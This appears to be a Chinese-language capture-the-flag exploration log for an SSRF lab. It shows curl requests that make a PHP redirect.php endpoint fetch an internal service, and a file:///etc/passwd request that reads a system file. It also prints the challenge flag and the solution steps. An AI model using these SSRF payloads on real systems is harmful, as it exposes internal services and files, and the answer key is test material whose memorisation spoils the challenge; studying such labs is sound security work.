# xben-020-24 · 探索记录

对应题解：[`xben-020-24.md`](./xben-020-24.md)

## 目标与起点

容器 `10.0.173.136:80`，`Apache/2.4.54` + `X-Powered-By: PHP/7.4.33`，
标题 `SSRF Demo`。

首页正文直接给出：

```html
<p>Additional information is available internally for our employees at
   http://internal-service<br>
   The service is only accessible from our internal network.</p>
<form action="redirect.php" method="GET">
  <input type="text" id="url" name="url" placeholder="http://example.com">
</form>
```

## 第一阶段：按题面直接打

```bash
curl --get --data-urlencode 'url=http://internal-service' http://$T/redirect.php
```

```html
<h1>Fetched Content</h1><pre>&lt;!DOCTYPE html&gt;
…Internal Service…
```

回显里有完整的 HTML（被转义），解开后：

```html
<h1>Internal Service</h1>
<p>This is a sensitive internal service.</p>
FLAG: flag{efd3f121-74bc-4c4a-b5b3-c0fe8a5db948}
```

一次命中。

## 第二阶段：顺手确认防护强度

| url | 结果 |
| --- | --- |
| `http://internal-service` | 200，返回内网页面 |
| `http://internal-service/` | 同上 |
| `http://internal-service/flag` | 目标服务 404（并且 PHP Warning 里泄露了 `/var/www/html/redirect.php` 路径） |
| `http://localhost/` | 返回本机 SSRF Demo 页面 |
| `file:///etc/passwd` | **200，直接读出 `/etc/passwd`** |

`file://` 可用说明这个 `file_get_contents()` 完全没有协议白名单。

另外那个 404 的 Warning 还顺带暴露了源码路径（`/var/www/html/redirect.php:6`），
对判断"是否有过滤"很有帮助。

## 第三阶段：拿 flag

```bash
curl --get --data-urlencode 'url=http://internal-service' http://$T/redirect.php \
| python3 -c 'import sys,html,re; s=sys.stdin.read(); \
m=re.search(r"<pre>(.*)</pre>",s,re.S); print(html.unescape(m.group(1)))'
```

提交：`correct: true, awarded: 200`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `http://internal-service/flag` | 目标 404 | 内网服务只提供根路径 |
| 猜 `http://internal-service/flag.txt` 等 | 未尝试（已直接拿到 flag） | 根路径就有 |

## 这次真正的收获

1. **题面给了目标就不要自己扫。** `http://internal-service` 明写在首页，
   一个请求就能拿到 flag；如果先去扫 172.x 网段会白花很多时间。
2. **回显型 SSRF 的判据很直接**：服务端抓取 → 转义 → 放进 `<pre>`。
   用 `html.unescape` 还原即可，不用处理重定向或状态码。
3. **用 `file://` 快速测协议限制。** 一次请求就能判断"有没有白名单"：
   本题完全放行，说明是教学用的最小复现。
4. **PHP Warning 也是情报。** 目标 404 时暴露了 `/var/www/html/redirect.php`
   的完整路径和行号，可以据此推断实现（裸 `file_get_contents`，无校验）。
